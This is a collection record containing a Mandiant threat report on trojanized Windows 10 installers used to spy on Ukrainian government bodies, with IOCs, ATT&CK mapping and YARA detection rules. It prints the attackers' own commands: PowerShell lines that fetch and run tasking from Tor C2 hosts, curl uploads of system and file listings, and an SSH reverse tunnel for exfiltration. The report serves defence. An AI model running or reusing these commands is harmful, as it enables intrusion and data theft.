{
    "id": "8c63ca1b-6918-4ee8-ad00-a9daea65bd20",
    "created_at": "2023-01-12T15:07:07.899558Z",
    "updated_at": "2025-03-27T02:15:24.919235Z",
    "deleted_at": null,
    "sha1_hash": "f3de869837814afffd60e6668d5fe38b2f3d1da6",
    "title": "2022-12-15 - Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government",
    "authors": "",
    "file_creation_date": "2022-12-29T00:33:12Z",
    "file_modification_date": "2022-12-29T00:33:12Z",
    "file_size": 7694678,
    "plain_text": "# Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government\n\n**[mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government](https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government)**\n\n## Executive Summary\n\nMandiant identified an operation focused on the Ukrainian government via trojanized Windows 10\nOperating System installers. These were distributed via torrent sites in a supply chain attack.\nThreat activity tracked as UNC4166 likely trojanized and distributed malicious Windows Operating\nsystem installers which drop malware that conducts reconnaissance and deploys additional\ncapability on some victims to conduct data theft.\nThe trojanized files use the Ukrainian language pack and are designed to target Ukrainian users.\nFollowing compromise targets selected for follow on activity included multiple Ukrainian\ngovernment organizations.\nAt this time, Mandiant does not have enough information to attribute UNC4166 to a sponsor or\npreviously tracked group. However, UNC4166’s targets overlap with organizations targeted by\nGRU related clusters with wipers at the outset of the war.\n\n## Threat Detail\n\n[Mandiant uncovered a socially engineered supply chain operation focused on Ukrainian government](https://services.google.com/fh/files/blogs/perspectives_on_security_volume_one_digital.pdf)\nentities that leveraged trojanized ISO files masquerading as legitimate Windows 10 Operating System\ninstallers. The trojanized ISOs were hosted on Ukrainian- and Russian-language torrent file sharing\nsites. Upon installation of the compromised software, the malware gathers information on the\ncompromised system and exfiltrates it. At a subset of victims, additional tools are deployed to enable\n\n\n-----\n\nfurther intelligence gathering. In some instances, we discovered additional payloads that were likely\ndeployed following initial reconnaissance including the STOWAWAY, BEACON, and SPAREPART\nbackdoors.\n\nOne trojanized ISO “Win10_21H2_Ukrainian_x64.iso” (MD5:\nb7a0cd867ae0cbaf0f3f874b26d3f4a4) uses the Ukrainian Language pack and could be\ndownloaded from “https://toloka[.]to/t657016#1873175.” The Toloka site is focused on a Ukrainian\naudience and the image uses the Ukrainian language (Figure 1).\nThe same ISO was observed being hosted on a Russian torrent tracker\n(https://rutracker[.]net/forum/viewtopic.php?t=6271208) using the same image.\nThe ISO contained malicious scheduled tasks that were altered and identified on multiple systems\nat three different Ukrainian organizations beaconing to .onion TOR domains beginning around midJuly 2022.\n\nFigure 1: Win10_21H2_Ukrainian_x64.iso (MD5: b7a0cd867ae0cbaf0f3f874b26d3f4a4)\n\n### Attribution and Targeting\n\nMandiant is tracking this cluster of threat activity as UNC4166. We believe that the operation was\nintended to target Ukrainian entities, due to the language pack used and the website used to distribute\nit. The use of trojanized ISOs is novel in espionage operations and included anti-detection capabilities\nindicates that the actors behind this activity are security conscious and patient, as the operation would\nhave required a significant time and resources to develop and wait for the ISO to be installed on a\nnetwork of interest.\n\nMandiant has not uncovered links to previously tracked activity, but believes the actor behind this\noperation has a mandate to steal information from the Ukrainian government.\n\n\n-----\n\nThe organizations where UNC4166 conducted follow on interactions included organizations that\nwere historically victims of disruptive wiper attacks that we associate with APT28 since the\noutbreak of the invasion.\nThis ISO was originally hosted on a Ukrainian torrent tracker called toloka.to by an account\n“Isomaker” which was created on the May 11, 2022.\nThe ISO was configured to disable the typical security telemetry a Windows computer would send\nto Microsoft and block automatic updates and license verification.\nThere was no indication of a financial motivation for the intrusions, either through the theft of\nmonetizable information or the deployment of ransomware or cryptominers.\n\n### Outlook and Implications\n\nSupply chain operations can be leveraged for broad access, as in the case of NotPetya, or the ability to\ndiscreetly select high value targets of interest, as in the SolarWinds incident. These operations\nrepresent a clear opportunity for operators to get to hard targets and carry out major disruptive attack\nwhich may not be contained to conflict zone.\n\nFor more research from Google Cloud on securing the supply chain, see this Perspectives on Security\nreport.\n\n## Technical Annex\n\nMandiant identified several devices within Ukrainian Government networks which contained malicious\nscheduled tasks that communicated to a TOR website from around July 12th, 2022. These scheduled\ntasks act as a lightweight backdoor that retrieves tasking via HTTP requests to a given command and\ncontrol (C2) server. The responses are then executed via PowerShell. From data collated by Mandiant,\nit appears that victims are selected by the threat actor for further tasking.\n\nIn some instances, we discovered devices had additional payloads that we assess were deployed\nfollowing initial reconnaissance of the users including the deployment of the STOWAWAY and BEACON\nbackdoors.\n\n[STOWAWAY is a](https://advantage.mandiant.com/malware/malware--d7ed01ba-8433-5910-abf8-5f0a3eefba11) [publicly available backdoor and proxy. The project supports several types of](https://github.com/ph4ntonn/Stowaway)\ncommunication like SSH, socks5. Backdoor component supports upload and download of files,\nremote shell and basic information gathering.\n\n[BEACON is a backdoor written in C/C++ that is part of the Cobalt Strike framework. Supported](https://advantage.mandiant.com/malware/malware--448e822d-8496-5021-88cb-599062f74176)\nbackdoor commands include shell command execution, file transfer, file execution, and file\nmanagement. BEACON can also capture keystrokes and screenshots as well as act as a proxy\nserver. BEACON may also be tasked with harvesting system credentials, port scanning, and\nenumerating systems on a network. BEACON communicates with a C2 server via HTTP or DNS.\n\nThe threat actor also began to deploy secondary toehold backdoors in the environment including\nSPAREPART, likely as a means of redundancy for the initial PowerShell bootstraps.\n\nSPAREPART is a lightweight backdoor written in C that uses the device’s UUID as a unique\nidentifier for communications with the C2. Upon successful connection to a C2, SPAREPART will\ndownload the tasking and execute it through a newly created process.\n\n\n-----\n\n## Details\n\n### Infection Vector\n\nMandiant identified multiple installations of a trojanized ISO, which masquerades as a legitimate\nWindows 10 installer using the Ukrainian Language pack with telemetry settings disabled. We assess\nthat the threat actor distributed these installers publicly, and then used an embedded schedule task to\ndetermine whether the victim should have further payloads deployed.\n\nWin10_21H2_Ukrainian_x64.iso (MD5: b7a0cd867ae0cbaf0f3f874b26d3f4a4)\n\nMalicious trojanized Windows 10 installer\nDownloaded from https://toloka.to/t657016#1873175\n\nForensic analysis on the ISO identified the changes made by UNC4166 that enables the threat actor to\nperform additional triage of victim accounts:\n\n### Modification of the GatherNetworkInfo and Consolidator Schedule Tasks\n\nThe ISO contained altered GatherNetworkInfo and Consolidator schedule tasks, which added a\nsecondary action that executed the PowerShell downloader action. Both scheduled tasks are legitimate\ncomponents of Windows and execute the gatherNetworkInfo.vbs script or waqmcons.exe process.\n\nFigure 2: Legitimate GatherNetworkInfo task configuration\nThe altered tasks both contained a secondary action that was responsible for executing a PowerShell\ncommand. This command makes use of the curl binary to download a command from the C2 server,\nthen the command is executed through PowerShell.\n\nThe C2 servers in both instances were addresses to TOR gateways. These gateways advertise as a\nmechanism for users to access TOR from the standard internet (onion.moe, onion.ws).\n\nThese tasks act as the foothold access into compromised networks, allowing UNC4166 to conduct\nreconnaissance on the victim device to determine networks of value for follow on threat activity.\n\n\n-----\n\nFigure 3: Trojanized GatherNetworkInfo task configuration\nBased on forensic analysis of the ISO file, Mandiant identified that the compromised tasks were both\nedited as follows:\n\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement\nProgram\\Consolidator (MD5: ed7ab9c74aad08b938b320765b5c380d)\n\nLast edit date: 2022-05-11 12:58:55\nExecutes: powershell.exe (curl.exe -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe -H\n('h:'+(wmic csproduct get UUID)))\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo (MD5:\n1433dd88edfc9e4b25df370c0d8612cf)\n\nLast edit date: 2022-05-11 12:58:12\nExecutes: powershell.exe curl.exe -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion.ws -H ('h:'+\n(wmic csproduct get UUID)) | powershell.exe\n\nNote: At the time of analysis, the onion[.]ws C2 server is redirecting requests to legitimate websites.\n\n### Software Piracy Script\n\nThe ISO contained an additional file not found in standard Windows distributions called\nSetupComplete.cmd. SetupComplete is a Windows batch script that is configured to be executed upon\ncompletion of the Windows installation but before the end user is able to use the device. The script\nappears to be an amalgamation of multiple public scripts including remove_MS_telemetry.cmd by\nDeltoidDelta and [activate.cmd by Poudyalanil (originally wiredroid) with the addition of a command to](https://gist.github.com/poudyalanil/ed1a7ed5603805833ca41cbaccefe0d5)\ndisable OneDriveSetup which was not identified in either script.\n\nThe script is responsible for disabling several legitimate Windows services and tasks, disabling\nWindows updates, blocking IP addresses and domains related to legitimate Microsoft services, disabling\nOneDrive and activating the Windows license.\n\nForensic artifacts led Mandiant to identify three additional scripts that were historically on the image, we\nassess that over time the threat actor has made alterations to these files.\n\nSetupComplete.cmd (MD5: 84B54D2D022D3DF9340708B992BF6669)\n\nBatch script to disable legitimate services and activate Windows\nFile currently hosted on ISO\n\n\n-----\n\nSetupComplete.cmd (MD5: 67C4B2C45D4C5FD71F6B86FA0C71BDD3)\n\nBatch script to disable legitimate services and activate Windows\nFile recovered through forensic file carving\nSetupComplete.cmd (MD5: 5AF96E2E31A021C3311DFDA200184A3B)\n\nBatch script to disable legitimate services and activate Windows\nFile recovered through forensic file carving\n\n## Victim Identification\n\nMandiant assesses that the threat actor performs initial triage of compromised devices, likely to\ndetermine whether the victims were of interest. This triage takes place using the trojanized schedule\ntasks. In some cases, the threat actor may deploy additional capability for data theft or new persistence\nbackdoors, likely for redundancy in the cases of SPAREPART or to enable additional tradecraft with\nBEACON and STOWAWAY.\n\nThe threat actor likely uses the device’s UUID as a unique identifier to track victims. This unique\nidentifier is transferred as a header in all HTTP requests both to download tasking and upload stolen\ndata/responses.\n\nThe threat actor’s playbook appears to follow a distinct pattern:\n\nExecute a command\nOptionally, filter or expand the results\nExport the results to CSV using the Export-Csv command and write to the path sysinfo\n(%system32%\\sysinfo)\nOptionally, compress the data into sysinfo.zip (%system32%\\sysinfo.zip)\nOptionally, upload the data instantaneously to the C2 (in most cases this is a separate task that is\nexecuted at the next beacon).\n\nMandiant identified the threat actor exfiltrate data containing system information data, directory listings\nincluding timestamps and device geo-location. A list of commands used can be found in the indicators\nsection.\n\nInterestingly, we did uncover a command that didn’t fit the aforementioned pattern in at least one\ninstance. This command was executed on at least one device where the threat actor had access for\nseveral weeks.\n\ncurl.exe -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe H h:filefile-file-file-file-filefilefile –output temp.zip\n\nAlthough we were not able to discover evidence that temp.zip was executed or recover the file, we were\nable to identify the content of the file directly from the C2 during analysis. This command is likely an\nalternative mechanism for the threat actor to collect the system information for the current victim,\nalthough it’s unclear why they wouldn’t deploy the command directly..\n\nchcp 65001; [console]::outputencoding = [system.text.encoding]::UTF8; Start-Process powershell argument “Get-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8” -wait -nonewwindow;\ncurl.exe -H (‘h:’+(wmic csproduct get UUID)) –data-binary “@sysinfo” -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe; rm sysinfo\n\n\n-----\n\nThe download command is notable as the threat actor uses a hardcoded UUID (filefile-file-file-filefilefilefile), which we assess is likely a default value. It’s unclear why the threat actor performed this\nadditional request in favor of downloading the command itself; we believe this may be used as a default\ncommand by the threat actors.\n\n## Follow On Tasking\n\nIf UNC4166 determined a device likely contained intelligence of value, subsequent actions were take on\nthese devices. Based on our analysis, the subsequent tasking fall into three categories:\n\nDeployment of tools to enable exfiltration of data (like TOR and Sheret)\nDeployment of additional lightweight backdoors likely to provide redundant access to the target\n(like SPAREPART)\nDeployment of additional backdoors to enable additional functionality (like BEACON and\nSTOWAWAY)\n\n### TOR Browser Downloaded\n\nIn some instances, Mandiant identified that the threat actor attempted to download the TOR browser\nonto the victim’s device. This was originally attempted through downloading the file directly from the C2\nvia curl. However, the following day the actor also downloaded a second TOR installer directly from the\nofficial torprojects.org website.\n\nIt’s unclear why the threat actor performed these actions as Mandiant was unable to identify any use of\nTOR on the victim device, although this would provide the actor a second route to communicate with\ninfrastructure through TOR or may be used by additional capability as a route for exfiltration.\n\nWe also discovered the TOR installer was also hosted on some of the backup infrastructure, which may\nindicate the C2 URLs resolve to the same device.\n\nbundle.zip (MD5: 66da9976c96803996fc5465decf87630)\n\nLegitimate TOR Installer bundle\nDownloaded from\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe/bundle.zip\nDownloaded from https://\n56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe/bundle.zip\n\n### Use of Sheret HTTP Server and localhost[.]run\n\n[In some instances, the threat actor deployed a publicly available HTTP server called Sheret to conduct](https://github.com/ethanpil/sheret)\ndata theft interactively on victim devices. The threat actor configured Sheret to server locally, then using\nSSH created a tunnel from the local device to the service localhost[.]run.\n\nIn at least one instance, this web server was used for serving files on a removable drive connected to\nthe victim device and Mandiant was able to confirm that multiple files were exfiltrated via this\nmechanism.\n\nThe command used for SSH tunnelling was:\n\n_ssh -R 80:localhost:80 -i defaultssh localhost[ ]run -o stricthostkeychecking=no >> sysinfo_\n\n\n-----\n\n_This command configures the local system to create a tunnel from the local device to the website_\n_localhost.run._\n\nC:\\Windows\\System32\\HTTPDService.exe (MD5: a0d668eec4aebaddece795addda5420d)\n\nSheret web server\nPublicly available as a build from https://github.com/ethanpil/sheret\nCompiled date: 1970/01/01 00:00:00\n\n### Deployment of SPAREPART, Likely as a Redundant Backdoor\n\nWe identified the creation of a service following initial recon that we believe was the deployment of a\nredundant backdoor we call SPAREPART. The service named “Microsoft Delivery Network” was created\nto execute %SYSTEM32%\\MicrosoftDeliveryNetwork\\MicrosoftDeliveryCenter with the arguments\n“56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe powershell.exe” via the\nWindows SC command.\n\nFunctionally SPAREPART is identical to the PowerShell backdoors that were deployed via the schedule\ntasks in the original ISOs. SPAREPART is executed as a Windows Service DLL, which upon execution\nwill receive the tasking and execute via piping the commands into the PowerShell process.\n\nSPAREPART will parse the raw SMIBOS firmware table via the Windows GetSystemFirmwareTable, this\n[code is nearly identical to code published by Microsoft on Github. The code’s purpose is to obtain the](https://github.com/microsoft/Windows-universal-samples/blob/main/Samples/CustomCapability/Service/Client/smbios.cpp)\nUUID of the device, which is later formatted into the same header (h: <UUID) for use in communications\nwith the C2 server.\n\nFigure 4: SPAREPART formatting of header\nThe payload parses the arguments provided on the command line. Interestingly there is an error in this\nparsing. If the threat actor provides a single argument to the payload, that argument is used as the URL\nand tasking can be downloaded. However, if the second command (in our instance powershell.exe) is\nmissing, the payload will later attempt to create a process with an invalid argument which will mean that\nthe payload is unable to execute commands provided by the threat actor.\n\n\n-----\n\nFigure 5: SPAREPART parsing threat actor input\nSPAREPART has a unique randomization for its sleep timer. This enables the threat actor to randomise\nbeaconing timing. The randomisation is seeded of the base address of the image in memory, this value\nis then used to determine a value between 0 and 59. This value acts as the sleep timer in minutes. As\nthe backdoor starts up, it’ll sleep for up to 59 minutes before reaching out to the C2. Any subsequent\nrequests will be delayed for between 3 and 4 hours.\n\nIf after 10 sleeps the payload has received no tasking (30-40 hours of delays), the payload will terminate\nuntil the service is next executed.\n\nFigure 6: SPAREPART randomizing the time for next beacon\nAfter the required sleep timer has been fulfilled, the payload will attempt to download a command using\nthe provided URL. The payload attempts to download tasking using the WinHttp set of APIs and the\nhard coded user agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101\nFirefox/91.0”. The payload attempts to perform a GET request using the previously formatted headers,\nproviding the response is a valid status (200), the data will be read and written to a previously created\npipe.\n\n\n-----\n\nFigure 7: SPAREPART downloading payload\nIf a valid response is obtained from the C2 server, the payload will create a new process using the\nsecond argument (powershell.exe) and pipe the downloaded commands as the standard input. The\npayload makes no attempt to return the response to the actor, similarly to the PowerShell backdoor.\n\nFigure 8: SPAREPART executing a command\n\n\n-----\n\nAlthough we witnessed the installation of this backdoor, the threat actor reverted to the PowerShell\nbackdoor for tasking a couple of hours later. Due to the similarities in the payloads and the fact the\nthreat actor reverted to the PowerShell backdoor, we believe that SPAREPART is a redundant backdoor\nlikely to be used if the threat actor loses access to the original schedule tasks.\n\nMicrosoftDeliveryCenter (MD5: f9cd5b145e372553dded92628db038d8)\n\nSPAREPART backdoor\nCompiled on: 2022/11/28 02:32:33\nPDB path: C:\\Users\\user\\Desktop\\ImageAgent\\ImageAgent\\PreAgent\\src\\builder\\agent.pdb\n\n### Deployment of Additional Backdoors\n\nIn addition to the deployment of SPAREPART, the threat actor also deployed additional backdoors on\nsome limited devices. In early September, UNC4166 deployed the payload AzureSettingSync.dll and\nconfigured its execution via a schedule task named AzureSync on at least one device. The schedule\ntask was configured to execute AzureSync via rundll32.exe.\n\nAzureSettingSync is a BEACON payload configured to communicate with cdnworld.org, which was\nregistered on the June 24, 2022 with an SSL certificate from Let’s Encrypt dated the 26th of August\n2022.\n\nC:\\Windows\\System32\\AzureSettingSync.dll (MD5: 59a3129b73ba4756582ab67939a2fe3c)\n\nBEACON backdoor\nOriginal name: tr2fe.dll\nCompiled on: 1970/01/01 00:00:00\nDropped by 529388109f4d69ce5314423242947c31 (BEACON)\nConnects to https://cdnworld[.]org/34192–general-feedback/suggestions/35703616-cdn–\nConnects to https://cdnworld[.]org/34702–general/sync/42823419-cdn\n\nDue to remediation on some compromised devices, we believe that the BEACON instances were\nquarantined on the devices. Following this, we identified the threat actor had deployed a STOWAWAY\nbackdoor on the victim device.\n\nC:\\Windows\\System32\\splwow86.exe (MD5: 0f06afbb4a2a389e82de6214590b312b)\n\nSTOWAWAY backdoor\nCompiled on: 1970/01/01 00:00:00\nConnects to 193.142.30.166:443\n%LOCALAPPDATA%\\\\SODUsvc.exe (MD5: a8e7d8ec0f450037441ee43f593ffc7c)\n\nSTOWAWAY backdoor\nCompiled on: 1970/01/01 00:00:00\nConnects to 91.205.230.66:8443\n\n## Indicators\n\n### Scheduled Tasks\n\n\n-----\n\nC:\\Windows\\System32\\Tasks\\MicrosoftWindowsNotificationCenter (MD5:\n16b21091e5c541d3a92fb697e4512c6d)\n\nSchedule task configured to execute Powershell.exe with the command line curl.exe -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe -H\n('h:'+(wmic csproduct get UUID)) | powershell\n\n### Trojanized Scheduled Tasks\n\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo (MD5:\n1433dd88edfc9e4b25df370c0d8612cf)\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement\nProgram\\Consolidator (MD5: ed7ab9c74aad08b938b320765b5c380d)\n\n### BEACON Backdoor\n\nC:\\Windows\\System32\\AzureSettingSync.dll (MD5: 59a3129b73ba4756582ab67939a2fe3c)\n\n### Scheduled Tasks for Persistence\n\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Maintenance\\AzureSync\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Maintenance\\AzureSyncDaily\n\n### STOWAWAY Backdoor\n\nC:\\Windows\\System32\\splwow86.exe (MD5: 0f06afbb4a2a389e82de6214590b312b)\n%LOCALAPPDATA%\\SODUsvc.exe (MD5: a8e7d8ec0f450037441ee43f593ffc7c)\n\n### Services for Persistence\n\nPrinter driver host for applications\nSODUsvc\n\n### On Host Recon Commands\n\nGet-ChildItem -Recurse -Force -Path ((C:)+’') | Select-Object -Property Psdrive, FullName, Length,\nCreationtime, lastaccesstime, lastwritetime | Export-Csv -Path sysinfo -encoding UTF8; CompressArchive -Path sysinfo -DestinationPath sysinfo.zip -Force;\nGet-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8\ninvoke-restmethod http://ip-api[.]com/json | Export-Csv -path sysinfo -encoding UTF8\nGet-Volume | Where-Object {.DriveLetter -and .DriveLetter -ne ‘C’ -and .DriveType -eq ‘Fixed’} |\nForEach-Object {Get-ChildItem -Recurse -Directory (.DriveLetter+‘:’) | Select-Object -Property\nPsdrive, FullName, Length, Creationtime, lastaccesstime, lastwritetime | Export-Csv -Path sysinfo encoding UTF8; Compress-Archive -Path sysinfo -DestinationPath sysinfo -Force; curl.exe -H\n(’h:’+(wmic csproduct get UUID)) –data-binary ‘@sysinfo.zip’ -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe\nchcp 65001; [console]::outputencoding = [system.text.encoding]::UTF8; Start-Process powershell argument “Get-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8” -wait -nonewwindow;\ncurl.exe -H (‘h:’+(wmic csproduct get UUID)) –data-binary “@sysinfo” -k\nhttps://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe; rm sysinfo\n\n\n-----\n\n### Trojanized Windows Image Network Indicators\n\n**Indicators of Compromise** **Signature**\n\n56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid[.]onion[.]moe Malicious\nWindows Image\nTor C2\n\nufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]moe Malicious\nWindows Image\nTor C2\n\nufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]ws Malicious\nWindows Image\nTor C2\n\n### BEACON C2s\n\nhttps://cdnworld[.]org/34192–general-feedback/suggestions/35703616-cdn–\nhttps://cdnworld[.]org/34702–general/sync/42823419-cdn\n\n### STOWAWAY C2s\n\n193.142.30[.]166:443\n91.205.230[.]66:8443\n\n## Appendix\n\n### MITRE ATT&CK Framework\n\n**ATT&CK Tactic Category** **Techniques**\n\n**Initial Access**\n\n[T1195.002:](https://attack.mitre.org/techniques/T1195/002/) Compromise Software Supply Chain\n\n**Persistence**\n\n[T1136:](https://attack.mitre.org/techniques/T1136/) Create Account\n\n[T1543.003:](https://attack.mitre.org/techniques/T1543/003/) Windows Service\n\n**Discovery**\n\n\n-----\n\n**Execution**\n\n**Defense Evasion**\n\n**Command and Control**\n\n**Resource Development**\n\n\n[T1049:](https://attack.mitre.org/techniques/T1049/) System Network Connections Discovery\n\n[T1047:](https://attack.mitre.org/techniques/T1047/) Windows Management Instrumentation\n\n[T1059:](https://attack.mitre.org/techniques/T1059/) Command and Scripting Interpreter\n\n[T1059.001:](https://attack.mitre.org/techniques/T1059/001/) PowerShell\n\n[T1059.005:](https://attack.mitre.org/techniques/T1059/005/) Visual Basic\n\n[T1569.002:](https://attack.mitre.org/techniques/T1569/002/) Service Execution\n\n[T1027:](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information\n\n[T1055:](https://attack.mitre.org/techniques/T1055/) Process Injection\n\n[T1140:](https://attack.mitre.org/techniques/T1140/) Deobfuscate/Decode Files or Information\n\n[T1218.011:](https://attack.mitre.org/techniques/T1218/011/) Rundll32\n\n[T1562.004:](https://attack.mitre.org/techniques/T1562/004/) Disable or Modify System Firewall\n\n[T1574.011:](https://attack.mitre.org/techniques/T1574/011/) Services Registry Permissions Weakness\n\n[T1071.004:](https://attack.mitre.org/techniques/T1071/004/) DNS\n\n[T1090.003:](https://attack.mitre.org/techniques/T1090/003/) Multi-hop Proxy\n\n[T1095:](https://attack.mitre.org/techniques/T1095/) Non-Application Layer Protocol\n\n[T1573.002:](https://attack.mitre.org/techniques/T1573/002/) Asymmetric Cryptography\n\n\n-----\n\n[T1587.002:](https://attack.mitre.org/techniques/T1587/002/) Code Signing Certificates\n\n[T1588.004:](https://attack.mitre.org/techniques/T1588/004/) Digital Certificates\n\n[T1608.003:](https://attack.mitre.org/techniques/T1608/003) Install Digital Certificate\n\n## Detection Rules\n```\n rule M_Backdoor_SPAREPART_SleepGenerator\n {\n   meta:\n     author = \"Mandiant\"\n     date_created = \"2022-12-14\"\n     description = \"Detects the algorithm used to determine the next sleep timer\"\n     version = \"1\"\n     weight = \"100\"\n     hash = \"f9cd5b145e372553dded92628db038d8\"\n     disclaimer = \"This rule is meant for hunting and is not tested to run in a\n production environment.\"\n   strings:\n     $ = {C1 E8 06 89 [5] C1 E8 02 8B}\n     $ = {c1 e9 03 33 c1 [3] c1 e9 05 33 c1 83 e0 01}\n     $ = {8B 80 FC 00 00 00}\n     $ = {D1 E8 [4] c1 E1 0f 0b c1}\n   condition:\n     all of them\n }\n\n```\n\n-----\n\n```\nrule M_Backdoor_SPAREPART_Struct\n{\n  meta:\n    author = \"Mandiant\"\n    date_created = \"2022-12-14\"\n    description = \"Detects the PDB and a struct used in SPAREPART\"\n    hash = \"f9cd5b145e372553dded92628db038d8\"\n    disclaimer = \"This rule is meant for hunting and is not tested to run in a\nproduction environment.\"\n  strings:\n    $pdb =\n\"c:\\\\Users\\\\user\\\\Desktop\\\\ImageAgent\\\\ImageAgent\\\\PreAgent\\\\src\\\\builder\\\\agent.pdb\"\nascii nocase\n    $struct = { 44 89 ac ?? ?? ?? ?? ?? 4? 8b ac ?? ?? ?? ?? ?? 4? 83 c5 28 89 84\n?? ?? ?? ?? ?? 89 8c ?? ?? ?? ?? ?? 89 54 ?? ?? 44 89 44 ?? ?? 44 89 4c ?? ?? 44 89\n54 ?? ?? 44 89 5c ?? ?? 89 5c ?? ?? 89 7c ?? ?? 89 74 ?? ?? 89 6c ?? ?? 44 89 74 ??\n?? 44 89 7c ?? ?? 44 89 64 ?? ?? 8b 84 ?? ?? ?? ?? ?? 44 8b c8 8b 84 ?? ?? ?? ?? ??\n44 8b c0 4? 8d 15 ?? ?? ?? ?? 4? 8b cd ff 15 ?? ?? ?? ?? }\n  condition:\n    (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and\n    $pdb and\n    $struct and\n    filesize < 20KB\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-15 - Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government.pdf"
    ],
    "report_names": [
        "2022-12-15 - Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
